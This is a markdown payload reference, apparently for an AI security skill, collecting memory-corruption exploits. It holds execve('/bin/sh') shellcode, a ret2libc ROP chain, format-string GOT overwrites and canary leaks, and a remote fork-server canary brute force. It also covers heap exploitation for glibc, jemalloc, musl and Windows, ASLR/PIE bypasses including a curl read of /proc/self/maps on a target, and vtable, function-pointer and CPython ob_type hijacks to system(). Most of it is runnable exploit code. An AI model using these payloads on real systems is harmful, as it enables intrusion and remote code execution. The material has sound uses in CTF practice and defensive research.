# Exploitation Payloads — Memory Safety Vulnerabilities
<!-- Reference file for the detect-memory security skill -->
<!-- Covers: stack overflow, format string, heap exploitation, ASLR bypass, canary bypass, control flow hijack, language-specific -->

---

## 1. Stack Overflow Payloads

### Offset Finding — pwntools cyclic

```python
from pwn import *

# Step 1: Generate a De Bruijn cyclic pattern
pattern = cyclic(512)
# Send pattern as input, observe crash EIP/RIP in debugger

# Step 2: Find offset from crash value
# x86: EIP = 0x61616167 (e.g.)
offset = cyclic_find(0x61616167)
# x86-64: read 8 bytes from RSP at crash (little-endian)
offset = cyclic_find(b'gaaa')   # first 4 bytes of 8-byte value
print(f"[+] Offset to return address: {offset}")
```

### Offset Finding — Metasploit pattern_create

```bash
# Generate pattern
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 512

# After crash, find offset from EIP value
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x61616167
# => [*] Exact match at offset 76
```

### x86 32-bit Shellcode — execve /bin/sh

```python
from pwn import *

# Classic execve(/bin/sh) — 23 bytes, no nulls
shellcode_x86 = (
    b"\x31\xc0"          # xor eax, eax
    b"\x50"              # push eax
    b"\x68\x2f\x2f\x73\x68"  # push "//sh"
    b"\x68\x2f\x62\x69\x6e"  # push "/bin"
    b"\x89\xe3"          # mov ebx, esp
    b"\x50"              # push eax
    b"\x53"              # push ebx
    b"\x89\xe1"          # mov ecx, esp
    b"\xb0\x0b"          # mov al, 0x0b (execve)
    b"\xcd\x80"          # int 0x80
)

# Build payload: [shellcode][padding][ret -> stack]
offset = 76
stack_addr = 0xffffd3c0   # leaked or guessed stack address
payload = shellcode_x86
payload += b"A" * (offset - len(shellcode_x86))
payload += p32(stack_addr)
```

### x86-64 Shellcode — execve /bin/sh

```python
from pwn import *

shellcode_x64 = (
    b"\x48\x31\xd2"                # xor rdx, rdx
    b"\x48\xbb\x2f\x2f\x62\x69"   # movabs rbx, "//bi"
    b"\x6e\x2f\x73\x68"           # (continued)  "n/sh"
    b"\x48\xc1\xeb\x08"            # shr rbx, 8
    b"\x53"                        # push rbx
    b"\x48\x89\xe7"               # mov rdi, rsp
    b"\x50"                        # push rax
    b"\x57"                        # push rdi
    b"\x48\x89\xe6"               # mov rsi, rsp
    b"\xb0\x3b"                    # mov al, 59 (execve)
    b"\x0f\x05"                    # syscall
)

offset = 120
ret_addr = 0x7fffffffde00   # leaked stack address
payload = shellcode_x64 + b"A" * (offset - len(shellcode_x64)) + p64(ret_addr)
```

### ROP Chain — ret2libc Template (pwntools)

```python
from pwn import *

elf  = ELF("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop  = ROP(elf)

# Step 1: leak libc base via puts(puts@GOT)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret_gadget = rop.find_gadget(["ret"])[0]   # stack alignment

offset = 72
payload  = b"A" * offset
payload += p64(pop_rdi)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(elf.sym["main"])   # return to main for stage 2

p = process("./vuln")
p.sendlineafter(b"Input: ", payload)
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym["puts"]
print(f"[+] libc base: {hex(libc.address)}")

# Step 2: call system("/bin/sh")
bin_sh  = next(libc.search(b"/bin/sh\x00"))
system  = libc.sym["system"]

payload2  = b"A" * offset
payload2 += p64(ret_gadget)       # 16-byte stack alignment
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(system)

p.sendlineafter(b"Input: ", payload2)
p.interactive()
```

---

## 2. Format String Payloads

### Stack Reading — Sequential and Direct Parameter Access

```python
# Sequential leak — dump 32 stack words
payload_seq = b"%08x." * 32

# Direct parameter — 6th argument (first on stack in x86-64 after registers)
payload_direct = b"%6$x"    # hex word
payload_ptr    = b"%6$p"    # pointer (with 0x prefix)
payload_str    = b"%6$s"    # string at address stored in arg 6
```

### Arbitrary Write — %n Family

```python
# %n  writes 4-byte count (x86-64: use %lln for 8-byte, %hn for 2-byte, %hhn for 1-byte)
# Write value 0x41 to address at arg 7:
#   print 0x41 chars then write count
payload = b"%65c%7$hhn"   # 0x41 = 65 decimal

# Write multi-byte value 0x0804a030 to target:
target = 0x0804a030
payload = fmtstr_payload(6, {target: 0xdeadbeef})  # see below
```

### GOT Overwrite — fmtstr_payload (pwntools)

```python
from pwn import *

elf = ELF("./vuln")
offset = 6   # format string argument offset (find with %1$p, %2$p, ...)

# Overwrite exit@GOT with system address
writes = {elf.got["exit"]: elf.plt["system"]}   # or real system addr after leak
payload = fmtstr_payload(offset, writes, numbwritten=0, write_size="byte")

p = process("./vuln")
p.sendline(payload)
p.interactive()
```

### Stack Canary Leak via Format String

```python
# Brute-force the canary position on stack:
for i in range(1, 64):
    p = process("./vuln")
    p.sendline(f"%{i}$p".encode())
    val = p.recvline()
    # Canary ends in \x00 (LSB = 0x00), looks like 0x????????00??????
    if b"0x" in val:
        v = int(val.strip(), 16)
        if (v & 0xff) == 0 and v != 0:
            print(f"[+] Canary likely at position {i}: {hex(v)}")
    p.close()
```

---

## 3. Heap Exploitation — glibc ptmalloc

### Tcache Poisoning (glibc < 2.32)

```python
from pwn import *

# Step 1: free two same-size chunks into tcache; chunk A is freed last
# Step 2: overwrite A->fd with target address (AAW primitive required)
# Step 3: two more mallocs — first returns A, second returns target

# Simplified PoC (assumes write-after-free or UAF)
target = elf.sym["__free_hook"]   # classic target pre-glibc 2.34

# [alloc A, alloc B] -> [free B, free A] -> tcache: A -> B
# Overwrite A->fd = target
# malloc() -> A (poisons next ptr)
# malloc() -> target  (write system here)
```

### Tcache Key Bypass (glibc >= 2.32, < 2.34)

```python
# glibc 2.32 added key field: chunk->key = tcache_perthread_struct ptr
# Double-free detected if key matches. Corrupt the key byte before second free.

# UAF write: overwrite 1 byte of chunk->key (second qword in user data)
# Then double-free succeeds -> dup pointer in tcache
```

### Safe-Linking Bypass (glibc >= 2.34)

```python
# Safe-linking: stored_fd = (chunk_addr >> 12) XOR next_ptr
# To poison: need to leak heap base (upper bits of any heap pointer >> 12)
# Then: fake_fd = (chunk_addr >> 12) ^ target

heap_leak   = 0x55555555b000   # leaked heap address
target      = 0x7ffff7d14b00   # e.g. __malloc_hook replacement target

# Compute mangled pointer
mangled = (heap_leak >> 12) ^ target
# Write mangled to freed chunk's fd field
```

### Fastbin Dup

```python
# free(A) -> free(B) -> free(A) — triggers double-free in fastbin list
# glibc checks A->fd != A (not same as head) so need B in between

# After dup: fastbin -> A -> B -> A -> ...
# malloc() -> A, malloc() -> B, malloc() -> A (attacker controls fd before last malloc)
# Aim fd at fake chunk with valid size field; malloc returns fake chunk
```

### Unsorted Bin Attack — libc Leak

```python
# Free a large chunk (> 0x400): goes to unsorted bin
# unsorted bin fd/bk point into main_arena (libc .data)
# UAF read of freed chunk fd = libc leak

# After leak:
libc_base = leaked_fd - (libc.sym["main_arena"] + 96)
```

### House of Force (glibc < 2.29)

```python
# Overwrite top chunk size field with 0xffffffffffffffff (heap overflow)
# Request a huge negative-delta allocation to move top chunk near target:
#   delta = target - (top_chunk_addr + 0x10)   (must be negative in signed sense)
# Next malloc returns target region

delta = target - (top_chunk + 0x10)
# alloc(delta) then alloc(size) -> returns target
```

---

## 4. Heap Exploitation — jemalloc

### Region Spray for Adjacency

```python
# jemalloc organizes memory into "runs" of same-size regions
# Spray many objects of identical size to fill a run, then free one
# The freed slot is reused deterministically within the run

spray = []
for _ in range(256):
    spray.append(alloc(0x40))   # fill current run with 0x40-class regions
free(spray[128])                # free middle region
victim = alloc(0x40)            # returns same slot -> UAF or overlap scenario
```

### Deterministic Tcache Reuse — REF2 Pattern

```python
# Pattern: free(ptr) + realloc(same_slot_size) returns the same region
# Used when object vtable / function pointer is in freed slot

obj_ptr = alloc_object(0x80)    # allocate object with dictType ptr at offset 0
free_object(obj_ptr)            # freed — slot available in tcache/run
fake_obj = alloc(0x80)          # deterministically reuses same slot
# Write fake dictType into fake_obj — hijacks function pointer on next object op
```

### Run Metadata Corruption

```python
# jemalloc run header sits at start of OS page; overflow from adjacent region
# Corrupt nfree count or bitmap to make jemalloc believe a slot is free
# Next alloc for that size class returns the "freed" (still-in-use) slot
# -> type confusion / double-use overlap
```

---

## 5. Heap Exploitation — musl-malloc

### Group Corruption

```python
# musl uses "groups" of same-size slots with a bitmap at the start
# Overflow into group header: corrupt the bitmap (avail bits)
# Set a bit that marks an in-use slot as free
# Next malloc for that size returns the in-use slot -> overlap
```

### Unbin Attack — Classic Unlink-Style Write

```python
# musl's unbin(c, i) performs a classic unlink:
#   c->next->prev = c->prev
#   c->prev->next = c->next
# Control both next and prev pointers of a freed chunk (via overflow/UAF)
# Write target address pair to achieve arbitrary write:
#   set chunk->prev = target - offsetof(next)
#   set chunk->next = write_value
# When unbin triggers (on next malloc): target is overwritten
```

---

## 6. Heap Exploitation — Windows

### LFH (Low Fragmentation Heap) Exploitation

```python
# LFH activates automatically after ~18 allocations of the same size
# LFH buckets are randomized within a UserBlock page; no deterministic ordering
# Strategy: spray target-size allocs, free some, reallocate to get overlap

# Activate LFH for size 0x40:
for i in range(20):
    HeapAlloc(heap, 0, 0x38)   # 0x38 + header = 0x40 bucket

# Now free a subset and reallocate — overlapping object possible
# UAF: keep dangling pointer after HeapFree, then HeapAlloc same size
```

### Segment Heap (Windows 10+) — Encoded Headers

```python
# Windows 10 Segment Heap encodes chunk headers with a per-heap cookie:
#   encoded_size = chunk_size XOR heap_key XOR (chunk_addr >> 4)
# To corrupt a header, leak the heap key first (stored in _HEAP struct)
# Leak: info disclosure from an adjacent read OOB, or from heap handle
# Then forge: encoded = target_size ^ heap_key ^ (target_addr >> 4)
# Corrupt encoded header to redirect next allocation
```

---

## 7. ASLR / PIE Bypass Techniques

### Format String Leak

```python
from pwn import *

p = process("./vuln_pie")
elf = ELF("./vuln_pie")

# Dump stack until we see a code pointer (ends in binary's text segment pattern)
for i in range(1, 100):
    p.sendline(f"%{i}$p".encode())
    val = p.recvline().strip()
    if b"0x5" in val or b"0x4" in val:   # typical PIE range
        leak = int(val, 16)
        # Identify which function / offset this corresponds to in the binary
        elf.address = leak - elf.sym["some_function"] - known_offset
        print(f"[+] PIE base: {hex(elf.address)}")
        break
```

### Partial Overwrite — 12-bit Deterministic

```python
# With PIE + ASLR: lower 12 bits of any address are deterministic (page offset)
# Overwrite only the lowest 1-2 bytes of a stored return address or pointer
# to redirect within the same page without needing a full leak

# Example: overwrite LSB of stored RIP to land on win() offset within page
# win() is at PIE+0x1234, current ret points to PIE+0x1289
# Overwrite 1 byte: 0x89 -> 0x34  (1/1 deterministic if same page)
payload = b"A" * offset + b"\x34"
```

### /proc/self/maps Read

```bash
# If the target allows reading arbitrary files (path traversal, SSRF to localhost):
curl "http://target/read?file=/proc/self/maps"
# Or from within a process with file read primitive:
# Parse lines for the binary's base address (first mapping, r-xp)
# And for libc base (line containing libc-*.so with r-xp permission)
```

### Auxiliary Vector Traversal — REF1 Chain 1

```python
# Chain: read stack pointer via info leak -> locate AT_BASE in aux vector
#        -> parse ld-linux base -> walk link_map -> find libc load address

# Step 1: leak a stack address (format string / stack OOB)
stack_leak = leaked_ptr

# Step 2: scan backward on stack for AT_BASE entry (type = 7)
# aux vector format: [type: ptr-size][value: ptr-size] pairs, ending with [0][0]
# AT_BASE (7) holds ld-linux.so base address

# Step 3: from ld-linux base, parse ELF to find _r_debug / _dl_debug_addr
# Step 4: walk link_map linked list (l_next) until libc found by name
# Step 5: l_addr = libc base
```

### Heap Pointer Correlation — REF1 Chain 2

```python
# Chain: scan ~2 MB of heap -> find group/run pointers -> probe for ELF magic
#        -> verify GOT section -> extract libc address from GOT entry

# Step 1: heap OOB / UAF read to scan heap region
for offset in range(0, 2 * 1024 * 1024, 8):
    candidate = read_qword(heap_base + offset)
    # Step 2: candidate looks like a pointer -> probe for ELF magic \x7fELF
    if is_mapped(candidate) and read_bytes(candidate, 4) == b"\x7fELF":
        # Step 3: verify it's libc by checking e_type=ET_DYN and expected sections
        # Step 4: read GOT entry for a known function to confirm
        libc_base = candidate
        break
```

### DEBUG OBJECT Info Leak — REF2

```python
# Pattern seen in Redis-like engines:
# robj (Redis object) -> ptr field -> dict -> dictType pointer (PIE .data ptr)
# dictType is a static struct in the binary's .data section
# Its address reveals PIE base:

dictType_addr = read_ptr(dict_ptr + offsetof_dictType)
# dictType is at a known static offset within the binary:
pie_base = dictType_addr - binary_offset_of_dictType
```

---

## 8. Stack Canary Bypass

### Format String Leak

```python
from pwn import *

# Canary is placed at a fixed stack offset; find its %n$ position
# Canary always has LSB = 0x00 (null terminator protection)

p = process("./canary_vuln")
# Leak canary at known position (e.g., position 11)
p.sendline(b"%11$p")
canary = int(p.recvline().strip(), 16)
print(f"[+] Canary: {hex(canary)}")

# Build payload preserving canary:
# [padding to canary][canary][padding to RIP][rop chain]
offset_to_canary = 40   # bytes from input start to canary
offset_to_rip    = 8    # bytes from end of canary to return address

payload  = b"A" * offset_to_canary
payload += p64(canary)
payload += b"B" * offset_to_rip
payload += p64(win_addr)
```

### Byte-by-Byte Brute Force (fork Server)

```python
from pwn import *

# If target uses fork(), child shares parent's canary -> brute force byte by byte
# 64-bit canary: 7 unknown bytes (LSB always 0x00)

canary = b"\x00"
for byte_pos in range(1, 8):
    for b in range(256):
        p = remote("target", 1337)   # each connection is a fork()
        attempt = b"A" * 40 + canary + bytes([b])
        p.send(attempt)
        resp = p.recv(timeout=0.5)
        p.close()
        if b"Welcome" in resp or b"Success" in resp:   # no crash indicator
            canary += bytes([b])
            print(f"[+] Byte {byte_pos}: {hex(b)}")
            break
```

### Overwrite with Known Value

```python
# If canary value is derived from a predictable seed (weak PRNG, fixed seed):
# Compute expected canary and include it directly in payload

import ctypes
libc = ctypes.CDLL("libc.so.6")
libc.srand(0)                         # if seed is 0
predicted_canary = libc.rand() & 0xffffffffffffff00   # mask LSB

payload = b"A" * 40 + p64(predicted_canary) + b"B" * 8 + p64(win_addr)
```

---

## 9. Control Flow Hijack

### GOT Overwrite — Partial RELRO (REF1 Chain 2: strstr@GOT -> system)

```python
from pwn import *

elf  = ELF("./vuln")   # partial RELRO -> GOT is writable
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# After leaking libc base:
system = libc.address + libc.sym["system"]

# Overwrite strstr@GOT with system (next call: strstr("/bin/sh", ...) -> shell)
# Write primitive: format string %n or heap OOB into GOT page
writes = {elf.got["strstr"]: system}
payload = fmtstr_payload(offset, writes)

p = process("./vuln")
p.sendline(payload)
# Trigger: program calls strstr with attacker-controlled first arg = "/bin/sh"
p.sendline(b"/bin/sh")
p.interactive()
```

### Function Pointer Overwrite — Full RELRO Compatible (REF1 Chain 1: dictType.hashFunction -> system)

```python
# Full RELRO makes GOT read-only; target function pointers in writable .data/.bss
# REF1 pattern: dict->dictType points to static struct with hashFunction field
# hashFunction is called as: hashFunction(key)  -> attacker controls key

# Step 1: locate dictType struct in writable memory (heap copy or .data)
# Step 2: overwrite dictType->hashFunction with system address
# Step 3: ensure next dict lookup uses key = "/bin/sh\x00"
# Result: system("/bin/sh") called

dictType_on_heap = heap_base + known_offset
write_qword(dictType_on_heap + offsetof_hashFunction, system_addr)
trigger_lookup(b"/bin/sh")   # calls hashFunction("/bin/sh") = system("/bin/sh")
```

### Vtable Corruption (C++)

```python
# C++ objects store a vptr at offset 0 pointing to the vtable
# Vtable is an array of function pointers
# UAF / heap overflow -> overwrite vptr with fake vtable pointer

# Fake vtable layout: [method0_ptr, method1_ptr, ...]
# Place fake vtable in heap or BSS; point vptr there
# When virtual method N is called: *(vptr + N*8) is invoked with (this) as arg

# PoC (conceptual):
fake_vtable = heap_spray_addr
write_qword(fake_vtable + 0,  system_addr)    # virtual method 0 -> system
write_qword(object_addr + 0,  fake_vtable)    # overwrite vptr
# Trigger virtual call: obj->method0() => system(this)
# Arrange *this to start with "/bin/sh\x00" for clean shell
```

### moduleType Hijack — REF2 (free -> system via DEL)

```python
# Pattern from Redis-like engines using module/plugin object types
# robj->type points to a redisObjectType struct containing free/dealloc callbacks
# Forge or corrupt the type->free field to point to system
# Trigger: server deletes/expires the key -> calls type->free(robj->ptr)
# robj->ptr must equal "/bin/sh\x00"

# Step 1: allocate robj with ptr = "/bin/sh\x00"
# Step 2: overwrite robj->type with fake moduleType where .free = system
# Step 3: trigger DEL or key expiry
# Result: system("/bin/sh") called
```

---

## 10. Language-Specific Payloads

### Rust — unsafe Block Bounds Bypass

```python
# Rust enforces bounds in safe code; unsafe blocks may use raw pointer arithmetic
# Look for: slice::from_raw_parts, ptr::read/write, offset(), get_unchecked()
# Trigger: pass index/length that bypasses the unsafe block's manual check

# Example: length field stored in struct, read by unsafe code without validation
# OOB: send length = usize::MAX / 2 to wrap around and read/write arbitrary memory
# Exploit: leak adjacent heap data (heap spray + OOB read) or corrupt function ptr

# Fuzzing approach:
payload = struct.pack("<Q", 0xffffffffffffffff >> 1)   # huge length
# Prepend to normal input; if unsafe block trusts this length -> OOB
```

### Go — Runtime CGo Pointer Escape

```python
# Go's CGo allows calling C functions; Go pointers passed to C must not be retained
# Vulnerability: C code stores Go pointer after cgo call returns
# -> GC moves or frees the Go object; C retains dangling pointer

# Exploit pattern:
# 1. Trigger the CGo call that stores a Go pointer in a C-side global/struct
# 2. Force a GC cycle: runtime.GC() or allocate pressure
# 3. Allocate new Go object at the now-freed address
# 4. C side reads/writes through old pointer -> type confusion

# Detection: grep for `C.` calls storing return values of Go allocations
# Payload: trigger via malformed input that causes the C retention path
```

### Python — CPython Object Struct Corruption (ob_type -> fake type with tp_dealloc = system)

```c
/* CPython object layout (simplified):
   typedef struct {
       Py_ssize_t ob_refcnt;     // offset 0
       PyTypeObject *ob_type;    // offset 8  <- target
   } PyObject;

   PyTypeObject contains:
       tp_dealloc at offset 24 (varies by version)
*/

// Step 1: Obtain a writable reference to a Python object's ob_type pointer
//         (via ctypes, a C extension buffer overflow, or Pickle RCE)
// Step 2: Forge a fake PyTypeObject in a known-address buffer:
//         fake_type.tp_dealloc = &system
// Step 3: Overwrite target object's ob_type = &fake_type
// Step 4: Trigger deallocation (del obj / refcount -> 0)
// Result: tp_dealloc(obj) => system(obj)  -- arrange ob_refcnt region = "/bin/sh"
```

```python
import ctypes, sys

# PoC using ctypes to corrupt a Python string's ob_type (educational — crashes interpreter)
victim = b"/bin/sh"
victim_id = id(victim)

# Read ob_type pointer
ob_type = ctypes.c_size_t.from_address(victim_id + 8).value

# Build fake type object (simplified — real exploit needs full PyTypeObject layout)
# fake_type buffer at known address with tp_dealloc = system function pointer
system_ptr = ctypes.cdll.libc.system

class FakeType(ctypes.Structure):
    _fields_ = [("ob_refcnt", ctypes.c_ssize_t),
                ("ob_type",   ctypes.c_void_p),
                ("ob_size",   ctypes.c_ssize_t),
                ("tp_name",   ctypes.c_char_p),
                ("tp_basicsize", ctypes.c_ssize_t),
                ("tp_itemsize",  ctypes.c_ssize_t),
                ("tp_dealloc",   ctypes.c_void_p)]   # offset 48 in CPython 3.x

fake = FakeType()
fake.ob_refcnt  = 1
fake.ob_type    = ob_type
fake.tp_dealloc = ctypes.cast(system_ptr, ctypes.c_void_p).value

# Overwrite ob_type of victim object
ctypes.c_size_t.from_address(victim_id + 8).value = ctypes.addressof(fake)

# Trigger: decrement refcount to 0 -> tp_dealloc called with victim ptr
# (victim ptr starts with "/bin/sh" bytes)
del victim   # -> system("/bin/sh")
```

---
*End of payloads reference. Use in conjunction with cool_techniques.md and detect-memory skill methodology.*
